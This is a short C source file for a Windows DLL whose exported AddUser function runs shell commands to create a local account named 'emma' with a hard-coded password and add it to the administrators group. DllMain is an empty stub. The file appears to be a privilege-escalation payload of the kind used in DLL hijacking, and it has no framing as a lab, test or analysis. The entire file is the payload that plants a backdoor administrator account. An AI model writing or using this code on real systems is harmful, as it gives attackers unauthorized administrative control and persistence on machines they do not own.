#include <windows.h>
#include <stdlib.h>

// Function to be exported
__declspec(dllexport) void AddUser()
{
    system("net user emma Password123! /add");
    system("net localgroup administrators emma /add");
}

// DLL entry point (Optional but recommended for Windows DLLs)
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
